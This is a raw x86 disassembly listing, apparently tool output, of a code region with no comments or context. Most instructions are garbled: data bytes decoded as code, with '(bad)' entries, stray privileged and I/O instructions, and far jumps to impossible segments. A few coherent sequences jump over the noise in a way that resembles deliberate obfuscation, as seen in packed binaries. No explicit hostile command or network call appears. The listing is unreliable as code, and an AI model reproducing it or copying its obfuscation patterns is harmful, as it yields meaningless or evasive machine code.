  4213a0:	jmp    0x42146e
  4213a5:	jg     0x421331
  4213a7:	xchg   ecx,eax
  4213a8:	jle    0x42139f
  4213aa:	jg     0x4213ab
  4213ac:	mov    edx,DWORD PTR [edi+eax*8-0x22cf9a40]
  4213b3:	fstp   TBYTE PTR [eax]
  4213b5:	cli    
  4213b6:	test   BYTE PTR [ecx],al
  4213b8:	add    BYTE PTR [ecx-0x4000000],dh
  4213be:	aaa    
  4213bf:	and    DWORD PTR [eax-0x66],esp
  4213c2:	push   es
  4213c3:	jl     0x421353
  4213c5:	(bad)  
  4213c6:	int    0xc8
  4213c8:	aam    0x2a
  4213ca:	sbb    edi,edx
  4213cc:	stos   BYTE PTR es:[edi],al
  4213cd:	jmp    FWORD PTR [ecx+0x20]
  4213d0:	std    
  4213d1:	add    DWORD PTR [ecx],ecx
  4213d3:	sbb    eax,0xc794d8f7
  4213d8:	and    ebx,edi
  4213da:	mov    dh,0x99
  4213dc:	aaa    
  4213dd:	add    al,0x4
  4213df:	test   BYTE PTR [eax+0x4b4f38f3],0x27
  4213e6:	mov    BYTE PTR [ebp+0x275c533e],dl
  4213ec:	in     eax,0x29
  4213ee:	fst    DWORD PTR [edx+ebp*8]
  4213f1:	and    edi,edx
  4213f3:	sub    al,0x13
  4213f5:	shr    DWORD PTR [edi+0x47],0xd6
  4213f9:	jg     0x42138b
  4213fb:	adc    BYTE PTR [eax+edi*2-0x70],bl
  4213ff:	pop    eax
  421400:	xchg   ebx,eax
  421401:	add    BYTE PTR [ebp-0x3f],0x97
  421405:	ins    BYTE PTR es:[edi],dx
  421406:	xchg   esp,eax
  421407:	icebp  
  421408:	push   0xadbab7f0
  42140d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42140e:	xor    edx,esi
  421410:	pop    ds
  421411:	and    BYTE PTR [ebp+edx*1+0x1],0x72
  421416:	cmp    cl,bh
  421418:	(bad)  
  421419:	sti    
  42141a:	retf   
  42141b:	cli    
  42141c:	mov    es,WORD PTR [edx]
  42141e:	pop    ebx
  42141f:	inc    ebp
  421420:	fnsave [ecx+edi*1-0xe]
  421424:	xchg   ebp,eax
  421425:	test   BYTE PTR [esp+eax*4],ah
  421428:	jns    0x421488
  42142a:	or     dl,BYTE PTR [esi-0x43f42c7d]
  421430:	enter  0xfc7a,0x8
  421434:	scas   al,BYTE PTR es:[edi]
  421435:	cwde   
  421436:	mov    bh,0x15
  421438:	cmp    BYTE PTR [ecx+eax*2],al
  42143b:	jmp    0xba3b:0x5e520c6f
  421442:	pop    ebx
  421443:	jge    0x42149a
  421445:	aas    
  421446:	sub    bl,BYTE PTR [ebp-0x400f0eae]
  42144c:	inc    edi
  42144d:	mov    dh,0x4
  42144f:	pop    es
  421450:	jl     0x42148a
  421452:	je     0x421448
  421454:	xchg   esi,eax
  421455:	cmp    DWORD PTR [edi+eax*2-0x1a],0xffffffec
  42145a:	mov    eax,ds:0x5a782105
  42145f:	jb     0x421436
  421461:	add    ch,BYTE PTR [ebp-0x3ad5d834]
  421467:	and    eax,0xca17ce49
  42146c:	push   ebp
  42146d:	add    cl,BYTE PTR ds:0x601
  421473:	jmp    0x421541
  421478:	ins    DWORD PTR es:[edi],dx
  421479:	and    edx,DWORD PTR [edx]
  42147b:	sbb    eax,0x736f3d5e
  421480:	jmp    0xc56b:0xff59193b
  421487:	ret    
  421488:	stos   DWORD PTR es:[edi],eax
  421489:	test   DWORD PTR [ecx],eax
  42148b:	add    BYTE PTR [ecx+0x6000000],dh
  421491:	xor    ch,dl
  421493:	or     ebx,edi
  421495:	or     cl,ch
  421497:	and    ebp,DWORD PTR [ebp-0x72778440]
  42149d:	ror    DWORD PTR [ebx-0x21],cl
  4214a0:	dec    edx
  4214a1:	xchg   ebp,eax
  4214a2:	pop    edi
  4214a3:	xchg   edi,eax
  4214a4:	or     al,BYTE PTR [edi-0x59138d27]
  4214aa:	xchg   ebx,eax
  4214ab:	(bad)  
  4214ad:	sti    
  4214ae:	stos   BYTE PTR es:[edi],al
  4214af:	mov    DWORD PTR [edi],edi
  4214b1:	mov    bl,0x6a
  4214b3:	lahf   
  4214b4:	pop    ss
  4214b5:	xchg   edx,eax
  4214b6:	cmp    DWORD PTR [bx-0x6cf9],edi
  4214bb:	sahf   
  4214bc:	lea    esp,[ecx]
  4214be:	push   ds
  4214bf:	mov    WORD PTR [ebp-0x1b],fs
  4214c2:	dec    eax
  4214c3:	pop    ebx
  4214c4:	je     0x42146d
  4214c6:	sub    ah,BYTE PTR [ecx+esi*4+0x23b6b23a]
  4214cd:	push   0x4c4ce69d
  4214d2:	scas   al,BYTE PTR es:[edi]
  4214d3:	call   0x50c4:0x29863108
  4214da:	xor    BYTE PTR [ebx-0x5a28a97e],dh
  4214e0:	pop    ebx
  4214e1:	ffreep st(3)
  4214e3:	lea    edi,[edx]
  4214e5:	call   0xe419:0xa62b75e2
  4214ec:	xchg   ecx,eax
  4214ed:	push   edx
  4214ee:	sbb    eax,0x3af4b35d
  4214f3:	test   BYTE PTR [esi-0x2ecf0699],al
  4214f9:	je     0x421549
  4214fb:	sbb    DWORD PTR [ecx+0x6e],0x13490be7
  421502:	loope  0x4214a7
  421504:	daa    
  421505:	pop    ebp
  421506:	cwde   
  421507:	mov    edi,0x731a7cc6
  42150c:	push   edi
  42150d:	xor    ecx,ebp
  42150f:	test   BYTE PTR [ebx+0x72],dh
  421512:	int3   
  421513:	inc    ecx
  421514:	jmp    0x42152f
  421516:	ror    DWORD PTR [esi],0xf4
  421519:	jmp    0x421590
  42151b:	clc    
  42151c:	and    eax,0x25596b6b
  421521:	cdq    
  421522:	xchg   DWORD PTR [esi],ebp
  421524:	lock ss and eax,0x5e8e564d
  42152b:	add    ah,bh
  42152d:	in     eax,0x37
  42152f:	sub    al,0x94
  421531:	mov    ebp,0x6878c4bd
  421536:	xchg   ecx,eax
  421537:	sbb    ebx,DWORD PTR [edi+eax*2+0x40330b34]
  42153e:	fcom   DWORD PTR [esi]
  421540:	sub    DWORD PTR ds:0xffffe0ef,esi
  421546:	and    eax,ecx
  421548:	dec    ebx
  421549:	jmp    0x421617
  42154e:	aam    0x23
  421550:	dec    edx
  421551:	das    
  421552:	jmp    FWORD PTR [edi-0xb]
  421555:	sti    
  421556:	dec    BYTE PTR [ebx+ebx*1]
  421559:	sbb    al,0x72
  42155b:	mov    esp,DWORD PTR [ebp+0x70]
  42155e:	pop    esp
  42155f:	xchg   BYTE PTR [ecx],al
  421561:	add    BYTE PTR [ecx-0x20000000],dh
  421567:	add    eax,0xff071d61
  42156c:	(bad)
  42156f:	dec    edi
  421570:	cmc    
  421571:	jae    0x42156b
  421573:	pop    es
  421574:	xchg   ecx,eax
  421575:	mov    ah,0x74
  421577:	jae    0x4215cb
  421579:	jo     0x421507
  42157b:	or     al,0xc8
  42157d:	shl    dl,cl
  42157f:	(bad)  [edx+0xe]
  421582:	push   ebp
  421583:	and    al,0x85
  421585:	xor    ebx,DWORD PTR [edx-0x50]
  421588:	js     0x42156d
  42158a:	mov    ah,0x2e
  42158c:	(bad)  
  42158d:	in     al,0x38
  42158f:	dec    esi
  421590:	push   0xac4dcf1d
  421595:	xor    eax,0x3449e247
  42159a:	or     ah,BYTE PTR [eax-0xf]
  42159d:	add    DWORD PTR [ebx-0x23],ecx
  4215a0:	mov    dh,0xa0
  4215a2:	neg    DWORD PTR [ecx+edi*4]
  4215a5:	xchg   edx,eax
  4215a6:	fucomi st,st(1)
  4215a8:	mov    dh,0x9e
  4215aa:	rcl    al,cl
  4215ac:	dec    esi
  4215ad:	adc    DWORD PTR [eax-0x29],eax
  4215b0:	cmp    edx,esi
  4215b2:	cmc    
  4215b3:	ja     0x4215bb
  4215b5:	jge    0x421598
  4215b7:	sub    edi,eax
  4215b9:	inc    esi
  4215ba:	and    BYTE PTR [eax],ch
  4215bc:	pop    es
  4215bd:	or     dh,BYTE PTR [ebx]
  4215bf:	add    cl,dl
  4215c1:	call   0xb4b9b0d1
  4215c6:	mov    BYTE PTR ds:0x518438b1,al
  4215cc:	rcl    BYTE PTR [eax],1
  4215ce:	mov    esp,0xc850fcb2
  4215d3:	in     al,dx
  4215d4:	pop    edi
  4215d5:	fnstsw WORD PTR [esi]
  4215d7:	dec    ebp
  4215d8:	and    BYTE PTR [ebx+0x70],ch
  4215db:	push   ebp
  4215dc:	aam    0x4e
  4215de:	or     ebx,DWORD PTR [edx+esi*2+0x6]
  4215e2:	repnz push es
  4215e4:	or     BYTE PTR ds:[esi+0x47b4fbfb],bl
  4215eb:	add    eax,0xd338087b
  4215f0:	test   BYTE PTR [edi+0x29],ah
  4215f3:	aas    
  4215f4:	sbb    DWORD PTR [edi+0x70d389be],edx
  4215fa:	in     eax,0x50
  4215fc:	stc    
  4215fd:	(bad)  
  4215fe:	xor    DWORD PTR [ecx-0x25],eax
  421601:	mov    ebp,0x7f0804f1
  421606:	in     al,0xf2
  421608:	sub    eax,0xf3db982d
  42160d:	push   ss
  42160e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42160f:	jns    0x42166c
  421611:	stos   BYTE PTR es:[edi],al
  421612:	push   eax
  421613:	(bad)  
  421614:	pop    ss
  421615:	or     ch,dl
  421617:	and    eax,0x5f19
  42161c:	mov    DWORD PTR [ebp-0x18],eax
  42161f:	mov    ebx,DWORD PTR ds:0x42f688
  421625:	mov    eax,ds:0x42c008
  42162a:	sub    ebx,eax
  42162c:	and    ebx,DWORD PTR [ebx+eax*1]
  42162f:	mov    DWORD PTR [ebp-0x10],0x1
  421636:	mov    DWORD PTR [ebp-0x14],0x47ff
  42163d:	or     DWORD PTR ds:0x42f670,0x5de9
  421647:	mov    eax,DWORD PTR [ebp-0x14]
  42164a:	mov    ebx,DWORD PTR [ebp-0x10]
  42164d:	mov    edi,0x288
  421652:	cmp    DWORD PTR ds:0x42f5bc,0x0
  421659:	ja     0x421747
  42165f:	sub    DWORD PTR ds:0x42f5f4,0x53ff
  421669:	jmp    0x421747
  42166e:	push   0x2a65
  421673:	call   DWORD PTR ds:0x438814
  421679:	jmp    0x421747
  42167e:	ss nop
  421680:	and    al,0xfc
  421682:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421683:	cld    
  421684:	(bad)  
  421685:	fisub  DWORD PTR [edi-0x5a]
  421688:	adc    al,0xde
  42168a:	int    0x6
  42168c:	ja     0x4216f3
  42168e:	or     eax,0xb1000187
  421693:	add    BYTE PTR [eax],al
  421695:	add    BYTE PTR [ebx+0x67],dh
  421698:	adc    DWORD PTR [esi+0xd],esp
  42169b:	out    dx,eax
  42169c:	ins    BYTE PTR es:[edi],dx
  42169d:	dec    cl
  42169f:	ret    
  4216a0:	xor    al,0x32
  4216a2:	sar    esp,1
  4216a4:	arpl   WORD PTR [eax+0x5efa28a7],dx
  4216aa:	xchg   esi,eax
  4216ab:	sbb    eax,0x5df5aef0
  4216b0:	in     eax,0xba
  4216b2:	jecxz  0x421691
  4216b4:	mov    al,ds:0xf269ecd2
  4216b9:	out    dx,al
  4216ba:	mov    bl,BYTE PTR [ebp+0x35d55969]
  4216c0:	lods   eax,DWORD PTR ds:[esi]
  4216c1:	out    dx,al
  4216c2:	sub    eax,0xe2d6e776
  4216c7:	push   ecx
  4216c8:	or     eax,0x495e5622
  4216cd:	sbb    dh,BYTE PTR [ebx-0x77]
  4216d0:	sbb    eax,0xf790ed22
  4216d5:	scas   eax,DWORD PTR es:[edi]
  4216d6:	outs   dx,DWORD PTR ds:[esi]
  4216d7:	cmp    eax,0xd5352479
  4216dc:	rcr    BYTE PTR [esi+0x1bc7d4f3],0xc0
  4216e3:	jle    0x421732
  4216e5:	call   0xb126f6dd
  4216ea:	imul   esp,DWORD PTR ds:0xb1ffdf48,0xffffff8b
  4216f1:	mov    ah,bl
  4216f3:	xor    ebp,edi
  4216f5:	cmp    eax,0x45196812
  4216fa:	sub    BYTE PTR [eax+0x6],dl
  4216fd:	add    ah,ah
  4216ff:	jge    0x421690
  421701:	jno    0x421717
  421703:	and    DWORD PTR ds:0xf7c97c70,ecx
  421709:	add    esp,0xec260161
  42170f:	std    
  421710:	sti    
  421711:	push   ebp
  421712:	fdivrp st(2),st
  421714:	test   al,0xf7
  421716:	aas    
  421717:	or     bh,ah
  421719:	jle    0x4216a2
  42171b:	daa    
  42171c:	scas   eax,DWORD PTR es:[edi]
  42171d:	and    ebx,DWORD PTR [ebx]
  42171f:	sbb    BYTE PTR [ecx-0x4f],bl
  421722:	inc    dl
  421724:	inc    edi
  421725:	lods   eax,DWORD PTR ds:[esi]
  421726:	sbb    DWORD PTR [esi],esi
  421728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421729:	and    DWORD PTR [edi-0x1f214e48],edi
  42172f:	mov    bl,0xbe
  421731:	jnp    0x421730
  421733:	out    dx,eax
  421734:	jmp    0x823457c
  421739:	jmp    0x71ac311d
  42173e:	mov    ah,0x3d
  421740:	stos   DWORD PTR es:[edi],eax
  421741:	jb     0x42173b
  421743:	repnz and al,0xc5
  421746:	jae    0x42176b
  421748:	(bad)  
  421749:	mov    ecx,0xa0d
  42174e:	jmp    0x42181c
  421753:	pop    ebp
  421754:	jno    0x421746
  421756:	sti    
  421757:	cld    
  421758:	sti    
  421759:	pop    edi
  42175a:	idiv   DWORD PTR [ebx]
  42175c:	popa   
  42175d:	mov    al,0xde
  42175f:	pop    eax
  421760:	add    al,0x9b
  421762:	mov    ebx,0x187be
  421767:	mov    cl,0x0
  421769:	add    BYTE PTR [eax],al
  42176b:	fmul   DWORD PTR [esi]
  42176d:	dec    edi
  42176e:	in     al,dx
  42176f:	push   esi
  421770:	test   al,0xbf
  421772:	loopne 0x421745
  421774:	xchg   esp,eax
  421775:	pop    ecx
  421776:	adc    ecx,DWORD PTR [ebx+0x73]
  421779:	add    eax,0xc840bf60
  42177e:	sbb    al,0x6
  421780:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421781:	test   al,0x46
  421783:	push   esi
  421784:	sub    edi,esi
  421786:	dec    edi
  421787:	stc    
  421788:	repnz int 0xc2
  42178b:	fs loopne 0x421726
  42178e:	sbb    al,0x1a
  421790:	and    DWORD PTR [eax],esi
  421792:	mov    al,ds:0x4ee508cc
  421797:	ins    BYTE PTR es:[edi],dx
  421798:	(bad)  
  421799:	rol    BYTE PTR [edx-0x4c],cl
  42179c:	pop    esi
  42179d:	mov    esp,0xaa65e8bc
  4217a2:	sub    ecx,DWORD PTR [eax]
  4217a4:	in     al,0x5c
  4217a6:	adc    eax,ebp
  4217a8:	es jb  0x42172f
  4217ab:	push   ebx
  4217ac:	mov    dh,0xd0
  4217ae:	mov    esp,esp
  4217b0:	xor    al,0x8f
  4217b2:	sub    cl,bl
  4217b4:	add    al,0x65
  4217b6:	mov    eax,ds:0xd84a91fe
  4217bb:	ss adc dl,cl
  4217be:	adc    esi,DWORD PTR [edi+0x52]
  4217c1:	fstp   TBYTE PTR [eax+ebp*2]
  4217c4:	das    
  4217c5:	pop    es
  4217c6:	nop
  4217c7:	ja     0x4217f3
  4217c9:	stos   DWORD PTR es:[edi],eax
  4217ca:	loop   0x421833
  4217cc:	fs aad 0xf
  4217cf:	xchg   ebp,eax
  4217d0:	sbb    ebp,ebp
  4217d2:	mov    cs,WORD PTR fs:[ebp-0x7a3031bd]
  4217d9:	retf   0xe1ca
  4217dc:	pop    edi
  4217dd:	mov    ch,0xeb
  4217df:	test   edx,0x93bdcd72
  4217e5:	or     BYTE PTR [edi],bl
  4217e7:	rol    BYTE PTR [ecx-0x9],0x99
  4217eb:	adc    eax,0x3c1118ed
  4217f0:	shr    bl,0xb4
  4217f3:	wbinvd 
  4217f5:	jnp    0x4217ed
  4217f7:	jnp    0x421854
  4217f9:	outs   dx,BYTE PTR ds:[esi]
  4217fa:	sbb    dl,bl
  4217fc:	fimul  WORD PTR [edi-0x41cbb0a]
  421802:	jb     0x42186e
  421804:	stos   DWORD PTR es:[edi],eax
  421805:	pop    eax
  421806:	mov    bh,0x46
  421808:	dec    ecx
  421809:	bound  edi,QWORD PTR ds:0xe77376e3
  42180f:	mov    WORD PTR [esi-0x47ea02ed],?
  421815:	(bad)  
  421816:	repnz and al,0xd4
  421819:	mov    DWORD PTR [ecx-0x1b],edx
  42181c:	xor    edx,edx
  42181e:	xor    eax,ecx
  421820:	div    ebx
  421822:	mov    edx,DWORD PTR [ebp-0x18]
  421825:	cmp    eax,edx
  421827:	mov    DWORD PTR ds:0x42f530,0x1d30
  421831:	jae    0x4239ff
  421837:	jmp    0x421905
  42183c:	pop    ecx
  42183d:	mov    ah,0xf9
  42183f:	lock std 
  421841:	std    
  421842:	pop    ecx
  421843:	mov    ebp,0xe495f533
  421848:	inc    ecx
  421849:	(bad)  
  42184a:	sar    BYTE PTR [edi+ebp*2-0x4efffe78],1
  421851:	add    BYTE PTR [eax],al
  421853:	add    BYTE PTR [eax],cl
  421855:	mov    ah,0x67
  421857:	and    DWORD PTR [ecx],edx
  421859:	mov    ebx,0x24c424fe
  42185e:	and    esp,ebx
  421860:	loope  0x421871
  421862:	les    edx,FWORD PTR [edx+0x6400d6ac]
  421868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421869:	ds jl  0x4218be
  42186c:	ret    0xa1dd
  42186f:	int3   
  421870:	imul   ecx,DWORD PTR [ebp+0x1c964519],0x3ac20f7a
  42187a:	rol    DWORD PTR [ebx+0x4e],0x83
  42187e:	call   0x52064fca
  421883:	pop    ss
  421884:	inc    esp
  421885:	inc    ebx
  421886:	test   al,0x5b
  421888:	sahf   
  421889:	sbb    dh,BYTE PTR [ecx]
  42188b:	pop    esp
  42188c:	adc    edi,ebx
  42188e:	aaa    
  42188f:	lds    ebp,FWORD PTR [eax+0x1f]
  421892:	jns    0x421885
  421894:	push   0x225b9eb9
  421899:	mov    edi,0xb4dc7d2f
  42189e:	xor    cl,bl
  4218a0:	jae    0x42182c
  4218a2:	sub    al,0x8b
  4218a4:	pop    esi
  4218a5:	pushf  
  4218a6:	cmc    
  4218a7:	inc    esp
  4218a8:	retf   0x2a3a
  4218ab:	and    al,0xdc
  4218ad:	rol    ah,cl
  4218af:	sbb    BYTE PTR [edx],ah
  4218b1:	or     eax,0x3e09efe8
  4218b6:	ss inc ebx
  4218b8:	mov    BYTE PTR ds:0x3267124e,dh
  4218be:	dec    eax
  4218bf:	pop    esp
  4218c0:	cmp    BYTE PTR [esi+0x38a8a851],bl
  4218c6:	fidivr WORD PTR [ecx]
  4218c8:	mov    ebx,DWORD PTR [ecx+esi*8+0x7f]
  4218cc:	adc    eax,0xd9f66510
  4218d1:	adc    BYTE PTR [ebx-0x63],0x80
  4218d5:	iret   
  4218d6:	fnsave [edi+0x4264648]
  4218dc:	xor    esp,ebp
  4218de:	xchg   ecx,eax
  4218df:	mov    bl,0x4f
  4218e1:	sbb    eax,0x18b88c1b
  4218e6:	ins    DWORD PTR es:[edi],dx
  4218e7:	cmp    dl,bl
  4218e9:	xlat   BYTE PTR ds:[ebx]
  4218ea:	mov    bh,0xa6
  4218ec:	dec    esp
  4218ed:	in     al,dx
  4218ee:	xchg   edi,eax
  4218ef:	cli    
  4218f0:	repz out 0x50,al
  4218f3:	xor    bh,BYTE PTR [eax+0x49f3aa65]
  4218f9:	mov    DWORD PTR [ebx-0x1e],ecx
  4218fc:	jb     0x42188f
  4218fe:	cmp    eax,0xc870a82d
  421903:	gs ja  0x4218cd
  421906:	inc    ebp
  421907:	clc    
  421908:	loop   0x421957
  42190a:	add    BYTE PTR [eax],al
  42190c:	add    DWORD PTR ds:0x42f60c,edx
  421912:	mov    DWORD PTR [ebp-0xc],0x3726
  421919:	add    eax,0x32e0
  42191e:	jmp    0x4219ec
  421923:	adc    bh,dl
  421925:	cmp    ebp,ebx
  421927:	(bad)  
  421928:	push   esp
  42192a:	fild   QWORD PTR [eax+ebx*2]
  42192d:	sbb    esp,esp
  42192f:	fsubr  QWORD PTR [ebp-0x76df2126]
  421935:	add    DWORD PTR [eax],eax
  421937:	mov    cl,0x0
  421939:	add    BYTE PTR [eax],al
  42193b:	rcr    ebx,1
  42193d:	dec    ebx
  42193e:	ret    
  42193f:	lods   al,BYTE PTR ds:[esi]
  421940:	xchg   ebp,eax
  421941:	rol    DWORD PTR [edx+ebx*4+0x2e32aafc],0x84
  421949:	out    dx,eax
  42194a:	dec    esi
  42194b:	in     eax,dx
  42194c:	xchg   ebx,eax
  42194d:	scas   eax,DWORD PTR es:[edi]
  42194e:	test   eax,0x3b8806b
  421953:	(bad)  
  421955:	pop    ecx
  421956:	rol    DWORD PTR [edx],0xc0
  421959:	sbb    eax,0xd217c8b0
  42195e:	mov    ebp,0xba051c43
  421963:	call   0x9399974c
  421968:	add    esp,eax
  42196a:	mov    gs,WORD PTR [ecx+0x17]
  42196d:	xchg   ecx,eax
  42196e:	push   ecx
  42196f:	and    eax,0x8d5d3301
  421974:	pop    eax
  421975:	daa    
  421976:	mov    ds:0x27397b1e,eax
  42197b:	or     BYTE PTR es:[esi-0x7],ch
  42197f:	ins    BYTE PTR es:[edi],dx
  421980:	and    eax,0x6229d5ed
  421985:	sub    al,0x80
  421987:	nop
  421988:	xchg   BYTE PTR [ecx],cl
  42198a:	aam    0x2b
  42198c:	in     eax,0xe9
  42198e:	aas    
  42198f:	cs sahf 
  421991:	jmp    0x42195c
  421993:	add    eax,0xe3f31487
  421998:	jno    0x42191a
  42199a:	std    
  42199b:	inc    edi
  42199c:	xchg   BYTE PTR [esp+ebp*2+0x30],cl
  4219a0:	push   es
  4219a1:	jns    0x421974
  4219a3:	inc    edi
  4219a4:	std    
  4219a5:	jne    0x42199e
  4219a7:	sub    DWORD PTR [esi*1+0x329d34e6],ebx
  4219ae:	pop    ebp
  4219af:	mov    al,0x47
  4219b1:	jge    0x421972
  4219b3:	add    DWORD PTR [esi],ebx
  4219b5:	fisub  WORD PTR [edi+0x5336fb2b]
  4219bb:	dec    edi
  4219bc:	xor    eax,0xeb1116df
  4219c1:	lods   al,BYTE PTR ds:[esi]
  4219c2:	(bad)  
  4219c3:	push   ebx
  4219c4:	in     eax,0x2d
  4219c6:	sbb    edx,DWORD PTR [ebp+0x6a3a21a0]
  4219cc:	inc    eax
  4219cd:	pop    esi
  4219ce:	inc    esi
  4219cf:	push   ebp
  4219d0:	mov    cl,0x86
  4219d2:	ror    ebp,cl
  4219d4:	adc    bl,bl
  4219d6:	dec    esp
  4219d7:	ja     0x4219c0
  4219d9:	stos   BYTE PTR es:[edi],al
  4219da:	daa    
  4219db:	mov    BYTE PTR [edx],bl
  4219dd:	iret   
  4219de:	mov    BYTE PTR [edx-0x40],al
  4219e1:	bound  dx,DWORD PTR [ecx-0xc]
  4219e5:	mov    ds:0xe212ca25,eax
  4219ea:	je     0x42199b
  4219ec:	mov    DWORD PTR [ebp-0x10],0x2e39
  4219f3:	add    edx,DWORD PTR ds:0x42f5e4
  4219f9:	mov    DWORD PTR [ebp-0x14],0x7c06
  421a00:	cmp    DWORD PTR ds:0x42f540,0x0
  421a07:	jge    0x421a27
  421a0d:	or     DWORD PTR ds:0x42f62c,0x1bde
  421a17:	jmp    0x421a27
  421a1c:	push   0x8ac3
  421a21:	call   DWORD PTR ds:0x4387b0
  421a27:	mov    DWORD PTR [ebp-0x18],0x6909
  421a2e:	mov    eax,DWORD PTR [ebp-0x18]
  421a31:	mov    edx,DWORD PTR [ebp-0x14]
  421a34:	jmp    0x421b02
  421a39:	mov    eax,0x8fe686b7
  421a3e:	idiv   eax
  421a40:	push   DWORD PTR [edi+0x5602535a]
  421a46:	into   
  421a47:	outs   dx,DWORD PTR ds:[esi]
  421a48:	(bad)  
  421a4a:	mov    DWORD PTR [ecx],eax
  421a4c:	add    BYTE PTR [ecx+0x34000000],dh
  421a52:	sbb    esi,DWORD PTR cs:[eax+0x4d]
  421a56:	sub    eax,0xff5ce61f
  421a5b:	mov    al,0xaa
  421a5d:	add    al,0xf3
  421a5f:	mov    WORD PTR [ebx+0x6f81cb19],?
  421a65:	sbb    dh,al
  421a67:	cdq    
  421a68:	add    al,0x73
  421a6a:	mov    edi,0xaf0c8d8e
  421a6f:	sub    al,0x36
  421a71:	test   eax,0x960101dd
  421a76:	sbb    eax,DWORD PTR [ebp-0x65bf5d1]
  421a7c:	pop    edi
  421a7d:	call   0x7373:0xa8ccb8c
  421a84:	cmp    BYTE PTR [eax+edx*8-0x2f],0x7a
  421a89:	pop    edi
  421a8a:	push   ds
  421a8b:	mov    dl,0xcd
  421a8d:	clc    
  421a8e:	(bad)
  421a91:	scas   al,BYTE PTR es:[edi]
  421a92:	aam    0xd9
  421a94:	jno    0x421a79
  421a96:	dec    ebx
  421a97:	test   DWORD PTR [esi-0x20],esp
  421a9a:	add    DWORD PTR [edx],0x70
  421a9d:	(bad)  
  421a9e:	mov    dh,0x69
  421aa0:	mul    DWORD PTR [ecx-0x80]
  421aa3:	xor    ecx,DWORD PTR [edx+0xef8c449]
  421aa9:	mov    ds:0x1bebafde,eax
  421aae:	push   ebx
  421aaf:	(bad)  
  421ab1:	shl    DWORD PTR [ebp+0x63],cl
  421ab4:	mov    WORD PTR [ecx-0x67],?
  421ab7:	xchg   esi,eax
  421ab8:	mov    al,ds:0xd358d193
  421abd:	les    ebp,FWORD PTR ds:0x8da696e6
  421ac3:	ficom  DWORD PTR [ebp-0x5cb4d824]
  421ac9:	lds    di,DWORD PTR [eax+0x71e6246c]
  421ad0:	inc    ebp
  421ad1:	ficom  DWORD PTR [edx]
  421ad3:	leave  
  421ad4:	and    eax,0xd53e54f7
  421ad9:	cli    
  421ada:	mov    esp,0x15bc33a8
  421adf:	int    0x42
  421ae1:	stos   BYTE PTR es:[edi],al
  421ae2:	bound  edx,QWORD PTR [ebx+0x195ec50e]
  421ae8:	idiv   bl
  421aea:	mov    eax,0x18a63ee8
  421aef:	inc    ebp
  421af0:	sbb    DWORD PTR [edi+edi*2-0x5f],ecx
  421af4:	inc    ebp
  421af5:	push   ecx
  421af6:	popf   
  421af7:	hlt    
  421af8:	jns    0x421aca
  421afa:	cwde   
  421afb:	loope  0x421b49
  421afd:	inc    edi
  421afe:	xor    al,0x26
  421b00:	sti    
  421b01:	inc    eax
  421b02:	sub    edx,eax
  421b04:	mov    eax,DWORD PTR [ebp-0x10]
  421b07:	xor    edx,eax
  421b09:	mov    eax,DWORD PTR [ebp-0xc]
  421b0c:	sub    edx,0x2897
  421b12:	imul   edx,eax
  421b15:	mov    eax,DWORD PTR [ebp-0x8]
  421b18:	and    edx,eax
  421b1a:	jmp    0x421be8
  421b1f:	push   ss
  421b20:	xchg   ebx,eax
  421b21:	jmp    0x75d7:0xbe7bef52
  421b28:	and    dl,BYTE PTR [eax+0x70]
  421b2b:	inc    ebx
  421b2c:	aas    
  421b2d:	je     0x421b9c
  421b2f:	or     BYTE PTR [edx+0xb10001],0x0
  421b36:	add    BYTE PTR [edx+0x4a],ch
  421b39:	inc    edx
  421b3a:	call   0x95801f7c
  421b3f:	test   BYTE PTR [edx+0x3c63d4f0],dl
  421b45:	std    
  421b46:	call   0xf2b1:0xaeae25cd
  421b4d:	imul   edx,DWORD PTR [ecx+0x210b15eb],0x159348b2
  421b57:	xchg   ecx,eax
  421b58:	xchg   esi,eax
  421b59:	aaa    
  421b5a:	inc    esp
  421b5b:	cdq    
  421b5c:	lahf   
  421b5d:	dec    edi
  421b5e:	mov    al,ds:0x15f8836a
  421b63:	pop    esi
  421b64:	imul   eax,DWORD PTR [esi+0x4fb32776],0x45
  421b6b:	das    
  421b6c:	sahf   
  421b6d:	daa    
  421b6e:	stos   BYTE PTR es:[edi],al
  421b6f:	adc    DWORD PTR [esp+edx*1-0x6c],eax
  421b73:	and    ah,BYTE PTR [ebx]
  421b75:	adc    bh,dh
  421b77:	jae    0x421b36
  421b79:	mov    dh,0x59
  421b7b:	dec    esp
  421b7c:	lds    ebp,FWORD PTR [ebx-0x23]
  421b7f:	iret   
  421b80:	jo     0x421b5e
  421b82:	dec    eax
  421b83:	aam    0xb7
  421b85:	iret   
  421b86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b87:	add    eax,0x6c
  421b8a:	icebp  
  421b8b:	xchg   esi,eax
  421b8c:	xchg   ebx,eax
  421b8d:	imul   ecx,DWORD PTR [esi+0x47],0x40d0455d
  421b94:	pop    ss
  421b95:	sub    al,0x21
  421b97:	arpl   WORD PTR [ecx],dx
  421b99:	jmp    0x6e2e:0xad39ad86
  421ba0:	mov    DWORD PTR [edx+eiz*2],edx
  421ba3:	test   al,0xb2
  421ba5:	mov    edi,ebp
  421ba7:	sub    eax,0x624c3ea2
  421bac:	mov    gs,WORD PTR [esi+ebp*4]
  421baf:	add    BYTE PTR [ebx],cl
  421bb1:	push   edi
  421bb2:	inc    ecx
  421bb3:	xchg   esi,eax
  421bb4:	or     DWORD PTR [ebx-0x4f],eax
  421bb7:	mov    dh,0xc5
  421bb9:	xchg   edi,eax
  421bba:	xchg   esp,eax
  421bbb:	in     al,dx
  421bbc:	out    dx,eax
  421bbd:	inc    ebx
  421bbe:	mov    DWORD PTR [ecx+0x3da6d33b],esi
  421bc4:	out    0x7b,eax
  421bc6:	out    dx,al
  421bc7:	aas    
  421bc8:	or     eax,0xec3af0f7
  421bcd:	dec    esi
  421bce:	sub    eax,0x1b52f30d
  421bd3:	pop    es
  421bd4:	add    al,0x66
  421bd6:	mov    ds:0x9281a7b0,al
  421bdb:	mov    ah,ch
  421bdd:	and    BYTE PTR [ecx],0x3a
  421be0:	sbb    edx,edi
  421be2:	pop    edi
  421be3:	shr    DWORD PTR [edx+eax*8-0x42],cl
  421be7:	hlt    
  421be8:	xor    eax,eax
